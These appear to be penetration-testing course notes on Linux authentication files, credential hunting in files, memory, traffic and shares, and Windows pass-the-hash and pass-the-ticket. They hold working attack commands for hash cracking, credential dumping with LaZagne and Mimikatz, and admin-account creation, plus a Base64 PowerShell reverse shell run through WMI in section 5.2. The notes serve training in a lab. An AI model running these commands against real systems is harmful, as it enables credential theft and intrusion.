# Security Notes – Linux Authentication, Credential Hunting & Lateral Movement

---

## 1. Linux Authentication Process

Linux supports many ways to verify who you are when logging in. The most common system used for this is called **Pluggable Authentication Modules (PAM)**. Think of PAM as a middle layer that sits between you and the system — whenever you log in, change your password, or start a session, PAM handles it. The main PAM module that does the heavy lifting is `pam_unix.so` (or `pam_unix2.so`), located at `/usr/lib/x86_64-linux-gnu/security/` on Debian-based systems. This module manages four things: user information, authentication, sessions, and password changes.

For example, when you run the `passwd` command to change your password, PAM is automatically called in the background. It takes your new password, processes it securely, and stores it in the right place. Under the hood, `pam_unix.so` uses standard system library calls (APIs) to read from and write to two key files: `/etc/passwd` and `/etc/shadow`. PAM is also flexible — it supports other authentication methods like LDAP (for company directories), Kerberos (for network login), and mount-based authentication.

---

### 1.1 The /etc/passwd File

`/etc/passwd` is readable by all users and stores basic info about every user. Each line has 7 fields separated by colons (`:`). The fields are: Username, Password, User ID, Group ID, GECOS, Home Directory, and Default Shell. On modern systems the Password field shows `x`, meaning the actual hash is in `/etc/shadow`.

**Example entry:**
```
htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
```

If `/etc/passwd` is accidentally writable, an attacker can remove the root password field entirely, allowing passwordless root login:
```bash
# Check first line
head -n 1 /etc/passwd
# root::0:0:root:/root:/bin/bash  ← no password!

# Switch to root with no password
su
```

---

### 1.2 The /etc/shadow File

`/etc/shadow` stores hashed passwords and is only readable by root/admins. It has 9 fields per user: Username, Password Hash, Last Change, Min Age, Max Age, Warning Period, Inactivity Period, Expiration Date, and Reserved. A user listed in `/etc/passwd` but missing from `/etc/shadow` is considered invalid.

**Example entry:**
```
htb-student:$y$j9T$3QSBB6CbHEu...f8Ms:18955:0:99999:7:::
```

Each entry in `/etc/shadow` has 9 fields. Here is what each field means for the example above:

| Field | Value | What it means |
|-------|-------|---------------|
| Username | htb-student | The user this entry belongs to |
| Password | $y$j9T$3QSBB6CbHEu...f8Ms | The hashed password |
| Last change | 18955 | Days since Jan 1, 1970 when password was last changed |
| Min age | 0 | Minimum days before password can be changed (0 = anytime) |
| Max age | 99999 | Maximum days before password must be changed |
| Warning period | 7 | Days before expiry the user gets a warning |
| Inactivity period | - | Days after expiry before account is disabled |
| Expiration date | - | Date the account expires (empty = never) |
| Reserved field | - | Not currently used |

**Special cases for the Password field:**
- If it contains `!` or `*` — the user cannot log in using a regular Unix password. They can still use Kerberos or SSH key-based login.
- If the field is empty — no password is required to log in, which is a security risk and may cause some programs to refuse access.

**Password hash format:** `$<id>$<salt>$<hashed>`

The hash is split into three parts separated by `$`. The **ID** tells you which algorithm was used to hash the password, the **salt** is a random value added before hashing (makes each hash unique), and the **hashed** part is the actual encrypted password.

| ID | Algorithm |
|----|-----------|
| 1  | MD5 |
| 2a | Blowfish |
| 5  | SHA-256 |
| 6  | SHA-512 |
| sha1 | SHA1crypt |
| y  | Yescrypt (modern default on Debian) |
| gy | Gost-yescrypt |
| 7  | Scrypt |

Modern Debian/Ubuntu systems use **Yescrypt** (`$y$`) by default because it is much harder to crack. Older systems may still use MD5 or SHA-512, which are more vulnerable to cracking attacks.

---

### 1.3 The /etc/security/opasswd File

PAM can prevent users from reusing old passwords. Old hashes are stored in `/etc/security/opasswd`, readable only by root. Entries are comma-separated per user. Old entries may use MD5 (`$1$`), which is easier to crack than SHA-512. Attackers look here to find password patterns users repeat.

```bash
sudo cat /etc/security/opasswd
# cry0l1t3:1000:2:$1$HjFAfYTG$..., $1$kcUjWZJX$...
```

Looking at this output, we can see the file holds multiple old password hashes for the user `cry0l1t3`, each separated by a comma (`,`). The most important thing to notice here is the hash type — both start with `$1$`, which means they were hashed using **MD5**. MD5 is a very old and weak algorithm that is significantly easier and faster to crack compared to SHA-512 or Yescrypt. This matters because users tend to reuse similar passwords — for example, if their old password was `Summer2020!`, their new one might be `Summer2021!`. By cracking old hashes and spotting these patterns, attackers can make much better guesses at the current password.

---

### 1.4 Cracking Linux Credentials

Once we have root access on a Linux machine, we can collect all the user password hashes and try to crack them to recover the original plaintext passwords. The problem is that the user info is split across two files — `/etc/passwd` (which has usernames) and `/etc/shadow` (which has the hashes). Most cracking tools need both pieces of information in one place.

This is where a tool called **`unshadow`** comes in. It is included with **John the Ripper (JtR)** and its only job is to merge `/etc/passwd` and `/etc/shadow` into a single combined file that cracking tools can understand. Once we have that merged file, we can feed it into `hashcat` or JtR to crack the hashes and get the real passwords.

**Step 1 – Back up files:**
```bash
sudo cp /etc/passwd /tmp/passwd.bak
sudo cp /etc/shadow /tmp/shadow.bak
```

**Step 2 – Combine them:**
```bash
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

**Step 3 – Crack with hashcat (`-m 1800` = SHA-512):**
```bash
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

---

## 2. Credential Hunting in Linux

After gaining system access, hunting for credentials is a top priority. Credentials may allow privilege escalation in seconds. They can be found in four main categories: **Files**, **History**, **Memory**, and **Key-rings**. The approach should match the environment — an isolated database server will have fewer normal user accounts than a web server.

---

### 2.0 Files – Overview

In Linux, **everything is a file** — configs, logs, scripts, databases, and even hardware are represented as files. This makes file searching one of the most powerful techniques for finding credentials. We look through six key categories one by one: **Configuration files**, **Databases**, **Notes**, **Scripts**, **Cronjobs**, and **SSH keys**. Each category can hold credentials in different forms, so we must check them all carefully and not skip any.

Configuration files are especially important because they control how services work. They frequently contain usernames and passwords in plaintext so the service can authenticate automatically. These files usually have extensions like `.conf`, `.config`, or `.cnf`, but admins sometimes rename them or compile services in a way that changes the filename entirely. This is rare, but we should never assume a file is safe just because it has an unusual name or no extension at all.

---

### 2.1 Searching Configuration Files

Configuration files (`.conf`, `.config`, `.cnf`) often contain plaintext credentials. Use a loop to search all three extensions across the filesystem, excluding noise directories.

**Find all config files:**
```bash
for l in $(echo ".conf .config .cnf"); do
  echo -e "\nFile extension: " $l
  find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core"
done
```

**Search inside .cnf files for credentials:**
```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib"); do
  echo -e "\nFile: " $i
  grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#"
done
```

---

### 2.2 Searching for Databases

Database files (`.sql`, `.db`, `.*db`, `.db*`) may contain credentials or sensitive data. Use a loop to search for all common database file extensions.

```bash
for l in $(echo ".sql .db .*db .db*"); do
  echo -e "\nDB File extension: " $l
  find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man"
done
```

Firefox stores its cert/key databases (`cert9.db`, `key4.db`) in `~/.mozilla/firefox/`, which may contain saved credentials.

---

### 2.3 Searching for Notes

Notes may contain access credentials and are often stored without a specific extension. Search for both `.txt` files and files with no extension at all in user home directories.

```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

Results may include clipboard files, desktop metadata, and Firefox service worker files — all worth inspecting.

---

### 2.4 Searching for Scripts

Scripts often embed credentials so automated processes can run without manual input. Search for common script extensions: `.py`, `.sh`, `.pl`, `.go`, `.jar`, `.c`.

```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh"); do
  echo -e "\nFile extension: " $l
  find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share"
done
```

Pay attention to `.sh` scripts in `/etc/profile.d/` and similar locations that may be executed at login.

---

### 2.5 Enumerating Cronjobs

**Cronjobs** are scheduled tasks that run commands, programs, or scripts automatically at set times — without any human triggering them. Because they run on their own, the scripts they call sometimes need credentials (like a username and password) baked directly into them so the script can authenticate without asking anyone. This is a bad practice but very common. Cronjobs are split into two areas: **system-wide** jobs defined in `/etc/crontab`, and **user-specific** jobs managed per user. They are also organized by time intervals — `/etc/cron.hourly`, `/etc/cron.daily`, `/etc/cron.weekly`, and `/etc/cron.monthly`. On Debian systems, additional cron scripts live in `/etc/cron.d/`.

```bash
cat /etc/crontab
ls -la /etc/cron.*/
```

Look inside each script listed in the crontab for embedded usernames, passwords, or paths to keytab files.

---

### 2.6 Enumerating History Files

Bash history (`.bash_history`) often contains commands with credentials typed directly in the terminal. Also check `.bashrc` and `.bash_profile` for sensitive config.

```bash
tail -n5 /home/*/.bash*
```

**Example output showing a credential:**
```
/tmp/api.py cry0l1t3 6mX4UP1eWH3HXK
```

---

### 2.7 Enumerating Log Files

Log files are plain text files that Linux programs, services, and the OS itself write to continuously in the background. They record what is happening on the system — errors, login attempts, service activity, hardware events, and much more. For us as attackers, log files can reveal sensitive information like usernames, successful/failed logins, SSH connections, sudo commands, and even password change events. Log files are grouped into four categories: **Application logs**, **Event logs**, **Service logs**, and **System logs**.

Here are the most important log files to know:

| File | Description |
|------|-------------|
| `/var/log/messages` | Generic system activity logs |
| `/var/log/syslog` | Generic system activity logs |
| `/var/log/auth.log` | (Debian) All authentication-related logs |
| `/var/log/secure` | (RedHat/CentOS) All authentication-related logs |
| `/var/log/boot.log` | Booting information |
| `/var/log/dmesg` | Hardware and driver-related information |
| `/var/log/kern.log` | Kernel warnings, errors and logs |
| `/var/log/faillog` | Failed login attempts |
| `/var/log/cron` | Information related to cron jobs |
| `/var/log/mail.log` | All mail server related logs |
| `/var/log/httpd` | All Apache related logs |
| `/var/log/mysqld.log` | All MySQL server related logs |

Rather than reading every log file manually, we can use a one-liner to scan all of them at once and filter for keywords that typically reveal interesting security events:

```bash
for i in $(ls /var/log/* 2>/dev/null); do
  GREP=$(grep "accepted\|session opened\|failure\|failed\|ssh\|password changed\|sudo\|COMMAND=" $i 2>/dev/null)
  if [[ $GREP ]]; then
    echo -e "\n#### Log file: " $i
    grep "accepted\|session opened\|failure\|failed\|ssh\|password changed\|sudo\|COMMAND=" $i 2>/dev/null
  fi
done
```

---

### 2.8 Memory and Cache – Mimipenguin

When users log in and use applications, those programs often keep credentials in **memory (RAM)** or in **cache files** on disk so they don't have to ask for the password again every few seconds. For example, a logged-in GNOME desktop session may hold the user's credentials in memory while the session is active. Browsers also store credentials in memory while they are open. These in-memory credentials can be extracted by tools if you have root access — the OS doesn't encrypt RAM, so anything stored there is readable.

**Mimipenguin** is a Linux tool that does exactly this — it scans running processes and memory to pull out stored credentials. It is the Linux equivalent of Mimikatz on Windows, and it **requires root/administrator privileges** to run.

```bash
sudo python3 mimipenguin.py
# [SYSTEM - GNOME]    cry0l1t3:WLpAEXFa0SbqOHY
```

---

### 2.9 Memory and Cache – LaZagne

**LaZagne** is a much more powerful credential extraction tool than Mimipenguin. While Mimipenguin focuses on memory, LaZagne can reach into a huge number of sources across the system to pull passwords and hashes. It also requires root. The credentials it can retrieve come from (but are not limited to):

WiFi, Wpa_supplicant, Libsecret, Kwallet, Chromium-based browsers, CLI tools, Mozilla Firefox, Thunderbird, Git, ENV variables, Grub, Fstab, AWS, Filezilla, Gftp, SSH, Apache, Shadow file, Docker, KeePass, Mimipy, Sessions, and **Keyrings**.

**Keyrings** are worth a special mention — they are the OS-level password manager built into Linux desktop environments. They store passwords encrypted, protected by a master password, so users don't have to type the same passwords repeatedly. LaZagne can extract credentials from these as well.

```bash
sudo python2.7 laZagne.py all
```

Output shows found hashes and plaintext passwords from multiple sources like shadow and browser sessions.

---

### 2.10 Browser Credentials – Firefox

When you save a password in a browser like Firefox, it stores that credential **locally on the disk in an encrypted file**. This is convenient for the user but also a risk — the file is there for anyone with system access to find. Firefox specifically saves credentials in a hidden profile folder, encrypted and tied to a specific user. The stored data includes the website URL, the username field name, the password field name, and the encrypted username and password themselves. Many employees save work credentials in their browser without realizing that if an attacker gains access to the system, these can be decrypted easily and used to compromise company accounts.

Firefox saves credentials in a file called `logins.json`. Use **Firefox Decrypt** (requires Python 3.9) to decrypt them. LaZagne can also retrieve these.

```bash
# Find Firefox profile
ls -l .mozilla/firefox/ | grep default

# Read encrypted credentials
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

# Decrypt with Firefox Decrypt
python3.9 firefox_decrypt.py

# OR use LaZagne
python3 laZagne.py browsers
```

Decrypted output reveals the website URL, username, and plaintext password.

---

## 3. Credential Hunting in Network Traffic

In today's world, most applications use **TLS encryption** to protect data sent over the network. However, not every environment is properly secured. Legacy systems, misconfigured services, or test applications launched without HTTPS can still send data in plain, readable text. This gives attackers the chance to capture usernames and passwords directly from network traffic — a technique called **credential hunting in network traffic**. In this section, we look at how to find exposed credentials in cleartext protocols using **Wireshark** for manual analysis and **Pcredz** for automated extraction.

The table below shows common unencrypted protocols and their secure counterparts. While secure versions are more common today, older or misconfigured environments still use the unencrypted ones:

| Unencrypted Protocol | Encrypted Counterpart | Description |
|---|---|---|
| HTTP | HTTPS | Used for transferring web pages and resources over the internet. |
| FTP | FTPS/SFTP | Used for transferring files between a client and a server. |
| SNMP | SNMPv3 (with encryption) | Used for monitoring and managing network devices like routers and switches. |
| POP3 | POP3S | Retrieves emails from a mail server to a local client. |
| IMAP | IMAPS | Accesses and manages email messages directly on the mail server. |
| SMTP | SMTPS | Sends email messages from client to server or between mail servers. |
| LDAP | LDAPS | Queries and modifies directory services like user credentials and roles. |
| RDP | RDP (with TLS) | Provides remote desktop access to Windows systems. |
| DNS (Traditional) | DNS over HTTPS (DoH) | Resolves domain names into IP addresses. |
| SMB | SMB over TLS (SMB 3.0) | Shares files, printers, and other resources over a network. |
| VNC | VNC with TLS/SSL | Allows graphical remote control of another computer. |

---

### 3.1 Wireshark Filters

**Wireshark** is a well-known packet analyzer that comes pre-installed on nearly all pentesting Linux distributions. It lets you capture live network traffic or open saved `.pcap` files and search through them using powerful display filters. You can filter by protocol, IP address, port, MAC address, or even search for specific strings like `passw` inside packet content. This makes it possible to spot credentials being transmitted in plain text.

**Useful Wireshark filters:**

| Wireshark Filter | Description |
|---|---|
| `ip.addr == 56.48.210.13` | Shows only packets that involve a specific IP address (either sending or receiving). |
| `tcp.port == 80` | Shows packets on port 80, which is standard HTTP (unencrypted web traffic). |
| `http` | Shows all HTTP traffic — useful for finding unencrypted web requests. |
| `dns` | Shows DNS traffic — useful for monitoring which domain names are being looked up. |
| `tcp.flags.syn == 1 && tcp.flags.ack == 0` | Shows SYN packets only — helps detect port scanning or new connection attempts. |
| `icmp` | Shows ICMP (ping) packets — useful for spotting reconnaissance or connectivity checks. |
| `http.request.method == "POST"` | Shows HTTP POST requests — these often carry login forms with usernames and passwords in plaintext. |
| `tcp.stream eq 53` | Isolates a single TCP conversation between two hosts — useful for following a full session. |
| `eth.addr == 00:11:22:33:44:55` | Shows packets to or from a specific network device by its MAC address. |
| `ip.src == 192.168.24.3 && ip.dst == 56.48.210.3` | Shows traffic between two exact IP addresses — useful for tracking a specific connection. |

To search for credentials inside packet content, use a display filter like `http contains "passw"`. Alternatively, go to **Edit → Find Packet** and type `passw` to highlight matching packets. This is especially effective against unencrypted HTTP POST requests that contain login form data. It is worth learning Wireshark's filter syntax well — it is one of the most useful skills for network traffic analysis.

---

### 3.2 Pcredz

**Pcredz** is an automated tool that scans network traffic — either live or from a saved `.pcap` file — and extracts credentials for you. Instead of manually reading through thousands of packets in Wireshark, Pcredz does the searching automatically and outputs anything useful it finds. It supports extracting the following:

Credit card numbers, POP credentials, SMTP credentials, IMAP credentials, SNMP community strings, FTP credentials, credentials from HTTP NTLM/Basic headers and HTTP login forms, NTLMv1/v2 hashes from DCE-RPC, SMBv1/2, LDAP, MSSQL, and HTTP traffic, and Kerberos AS-REQ Pre-Auth (etype 23) hashes.

To run Pcredz, either clone the repository and install its dependencies, or use the official Docker container (see the Install section of the README). Then run it against a capture file:

```bash
# Run against a pcap file
./Pcredz -f demo.pcapng -t -v
```

Output shows discovered community strings, FTP usernames/passwords, and other credentials found in the capture.

---

## 4. Credential Hunting in Network Shares

Corporate network shares are used by employees every day to store and share files across teams. While useful, they frequently contain sensitive files — configuration files, scripts, and notes — that were left behind without anyone realizing they hold credentials. Attackers who gain network access can scan these shares systematically to find plaintext passwords, tokens, or keys that open doors to more privileged access.

---

### 4.0 Common Credential Patterns

Before jumping into tools, it helps to know what you are looking for. Understanding common file types and naming patterns that reveal credentials makes your search faster and more accurate. Here are the key tips to keep in mind:

- **Keywords in files** — search for `passw`, `user`, `token`, `key`, `secret` inside file content.
- **File extensions** — target `.ini`, `.cfg`, `.env`, `.xlsx`, `.ps1`, `.bat` as they commonly store credentials.
- **File names** — files with names like `config`, `passw`, `cred`, or `initial` are strong candidates.
- **Domain strings** — search for `INLANEFREIGHT\` inside files when targeting that domain.
- **Localize keywords** — a German company may use `Benutzer` instead of `user`; match the target's language.
- **Be strategic** — IT staff shares are far more valuable than photo or marketing shares; scan smart, not everything.

It is a good idea to start with simple command-line searches (e.g., `Get-ChildItem -Recurse -Include *.ext \\Server\Share | Select-String -Pattern ...`) before moving to automated tools. The tools below — **Snaffler**, **PowerHuntShares**, **MANSPIDER**, and **NetExec** — help automate and scale this process.

---

### 4.1 Snaffler (Windows)

**Snaffler** is a C# tool designed for domain-joined Windows machines. When run, it automatically finds all accessible network shares across the domain and searches them for files that look interesting — credentials, configs, key files, and more. Results are color-coded: **Red** = high priority (likely contains sensitive data), **Yellow** = worth reviewing, **Black** = not accessible.

```cmd
Snaffler.exe -s
```

All tools in this section produce a large amount of output. Many results will be **false positives** — files that match the search pattern but don't actually contain useful credentials. Manual review is always needed after the automated scan. Two flags help narrow down Snaffler's results:

- **`-u`** — Pulls a list of usernames from Active Directory and searches for references to those usernames inside files. Useful for finding files that mention specific people.
- **`-i` and `-n`** — Let you specify exactly which shares to include (`-i`) or exclude (`-n`) from the search. Use these to skip irrelevant shares and focus on high-value targets like IT or Finance.

---

### 4.2 PowerHuntShares (Windows)

**PowerHuntShares** is a PowerShell script that enumerates SMB shares, checks permissions, and generates an HTML report. It does not need to run on a domain-joined machine.

```powershell
Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
```

The HTML report categorizes findings as Critical, High, Medium, or Low, and lists interesting/sensitive/secret files discovered.

---

### 4.3 MANSPIDER (Linux)

If you do not have access to a domain-joined Windows machine, or simply prefer working from Linux, **MANSPIDER** lets you scan SMB shares remotely over the network. It connects to the target shares using provided credentials and searches file content for the strings you specify. It is best run using the official Docker container to avoid dependency issues — any files that match your search are automatically downloaded to a local `loot` folder for review.

```bash
docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider \
  10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'
```

---

### 4.4 NetExec Spider (Linux)

**NetExec** can spider SMB shares and filter for content matching a pattern using `--spider` and `--content`.

```bash
nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' \
  --spider IT --content --pattern "passw"
```

---

## 5. Pass the Hash (PtH)

**Pass the Hash (PtH)** is an attack where an attacker uses a password hash instead of the plaintext password for authentication — the hash does not need to be decrypted. The hash stays the same for every session until the password is changed, so it can be reused. To obtain a hash, the attacker must have administrative or specific privileges on the target machine — hashes can be grabbed from the SAM database, the NTDS.dit file on a Domain Controller, or directly from LSASS memory.

**Introduction to Windows NTLM:** NTLM (New Technology LAN Manager) is Microsoft's set of security protocols that verify a user's identity using a challenge-response method — the user never sends their actual password. Despite its known weaknesses, NTLM is still widely used for compatibility with older systems, even though Kerberos replaced it as the default in Windows 2000 Active Directory domains. The critical weakness: NTLM does **not salt** password hashes on the server or domain controller. This means an attacker who has a hash can authenticate directly without ever knowing the plaintext password — this is exactly what makes Pass the Hash possible.

---

### 5.1 PtH with Mimikatz (Windows)

**Mimikatz** is the first tool used to perform PtH on Windows. It has a module called `sekurlsa::pth` that starts a new process (like `cmd.exe`) running under the identity of the target user — using their hash instead of their password. You need the following four parameters:

- `/user` — the username you want to impersonate
- `/rc4` or `/NTLM` — the NTLM hash of that user's password
- `/domain` — the domain the user belongs to (for local accounts use `.`, `localhost`, or the computer name)
- `/run` — the program to launch in that user's context (defaults to `cmd.exe` if not set)

```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

A new `cmd.exe` window opens running as the target user. You can then access shares or run commands as that user.

---

### 5.2 PtH with Invoke-TheHash (Windows)

**Invoke-TheHash** is a collection of PowerShell functions that performs PtH using either **SMB** or **WMI** for command execution. It connects through .NET's TCPClient and passes the NTLM hash into NTLMv2 authentication. No local admin rights are needed on the attacker's machine, but the hash being used must have admin rights on the target. It takes these parameters:

- `Target` — hostname or IP of the target machine
- `Username` — the username to authenticate as
- `Domain` — the domain (not needed for local accounts or `@domain` format)
- `Hash` — the NTLM hash in either `LM:NTLM` or `NTLM` format
- `Command` — command to run on the target (if omitted, it just checks WMI access)

**Invoke-TheHash with SMB — Create a new admin user:**
```powershell
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
VERBOSE: [*] Trying to execute command on 172.16.1.10
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
```

**Get a reverse shell via WMI:** First start a Netcat listener on your machine (IP `172.16.1.5`, port `8001`):
```powershell
PS C:\tools> .\nc.exe -lvnp 8001

listening on [any] 8001 ...
```
Then generate a Base64 PowerShell reverse shell payload at `revshells.com` (select `PowerShell #3 Base64`, set your IP `172.16.1.5` and port `8001`). Then execute it using the machine name `DC01` via WMI:

**Invoke-TheHash with WMI:**
```powershell
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

[+] Command executed with process id 520 on DC01
```

The result is a reverse shell connection from the DC01 host (172.16.1.10).

---

### 5.3 PtH with Impacket (Linux)

**Impacket** is a collection of Python tools for working with network protocols. It supports many operations — command execution, credential dumping, and enumeration — all using PtH. The most common tool is `impacket-psexec`, which opens an interactive shell on the target machine using the hash. Other available tools include `impacket-wmiexec`, `impacket-atexec`, and `impacket-smbexec`.

```bash
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

Other tools available: `impacket-wmiexec`, `impacket-atexec`, `impacket-smbexec`.

---

### 5.4 PtH with NetExec (Linux)

**NetExec** is a post-exploitation tool that automates security assessments across large Active Directory networks. It can spray a hash across an entire subnet to find every machine where that hash grants local admin access — a technique similar to Password Spraying. When a result shows `Pwn3d!`, it means the hash works and the user is a local admin on that target. Use `-x` to run a command directly on any matching host. Note: spraying domain accounts can trigger lockouts, so use `--local-auth` for local account testing — this tries only one login per host and avoids domain lockout policies.

```bash
# Spray hash across a subnet
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

# Run a command on a specific target
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

Password reuse of local admin accounts across a subnet is common — organizations often use the same local admin password on many machines for easy administration. If this issue is found during an engagement, recommend implementing **LAPS (Local Administrator Password Solution)**, which randomizes the local admin password on each machine and rotates it on a set schedule.

---

### 5.5 PtH with Evil-WinRM (Linux)

**Evil-WinRM** performs PtH using PowerShell Remoting (WinRM) instead of SMB. It is useful when SMB is blocked on the target or when you do not have the administrative rights needed for SMB-based tools. It connects on port TCP/5985 (HTTP) or TCP/5986 (HTTPS).

```bash
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

For domain accounts, use the format `administrator@inlanefreight.htb`.

---

### 5.6 PtH with RDP via xfreerdp (Linux)

You can perform a PtH attack over RDP to get **GUI access** to the target using `xfreerdp`. However, there is an important requirement: **Restricted Admin Mode** must be enabled on the target machine — without it, RDP will reject the hash-based login and show an error. Enable it by adding a registry key on the target:

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Once the key is added (value `0` = Restricted Admin Mode enabled), connect using `xfreerdp` with the `/pth` flag:
```bash
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

**UAC Limitation:** UAC restricts which local accounts can perform remote admin operations. By default, only the built-in `Administrator` account (RID-500) is allowed to do remote PtH. Other local admin accounts are blocked unless the registry key `LocalAccountTokenFilterPolicy` is set to `1`. Exception: if `FilterAdministratorToken` is enabled (value `1`), even the RID-500 account is blocked from remote PtH. These restrictions apply only to local accounts — domain accounts with admin rights are not affected by this policy.

---

## 6. Pass the Ticket (PtT) from Windows

**Pass the Ticket** uses stolen Kerberos tickets (TGT or TGS) instead of NTLM hashes for lateral movement. Tickets are stored in LSASS memory. A TGT lets you request TGS tickets; a TGS grants access to a specific service.

---

### 6.0 Kerberos Protocol Refresher

Kerberos is a **ticket-based** authentication system. The key idea is that you never hand your password to every service — instead, Kerberos keeps all your tickets locally and gives each service only the specific ticket it needs, so tickets cannot be reused for unintended services.

- **TGT (Ticket Granting Ticket)** — the first ticket you get after logging in. It allows you to request more tickets (TGS) for specific services without re-entering your password.
- **TGS (Ticket Granting Service)** — requested when you want to access a specific service (e.g., a file share or database). The service uses this ticket to verify your identity.

When a user logs in, they encrypt the current timestamp with their password hash and send it to the Domain Controller. The DC decrypts it (it knows the user's hash), confirms the identity, and issues a TGT. From then on, the user uses that TGT to request TGS tickets for individual services — no password re-entry needed. For a PtT attack, we need either a valid **TGS** (to access one resource) or a **TGT** (to request tickets for any resource the user can access).

**Scenario:** Imagine you phished a user, got access to their machine, and escalated to local admin. You can now harvest Kerberos tickets from LSASS and use them to move laterally across the network.

---

### Pass the Ticket (PtT) Attack

To perform a PtT attack, we need a valid Kerberos ticket — either a **TGS** (Service Ticket) to access one specific resource, or a **TGT** (Ticket Granting Ticket) to request service tickets for any resource the user has access to. Before performing the attack, we first need to harvest tickets from the machine. We can do this using **Mimikatz** or **Rubeus**.

---

### 6.1 Harvesting Kerberos Tickets from Windows

On Windows, Kerberos tickets are stored and managed by the **LSASS** process. As a non-admin you can only see your own tickets; as a local admin you can collect all tickets from all sessions. Use `sekurlsa::tickets /export` to dump them all as `.kirbi` files to disk.

```cmd
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export

* Username : DC01$
* Domain   : inlanefreight.htb
* Saved to file [0;5063e]-1-0-40a50000-DC01$@LDAP-DC01.inlanefreight.htb.kirbi !

c:\tools> dir *.kirbi
-a----  7/12/2022  9:44 AM   1445  [0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
-a----  7/12/2022  9:44 AM   1565  [0;3e7]-0-2-40a50000-DC01$@cifs-DC01.inlanefreight.htb.kirbi
```

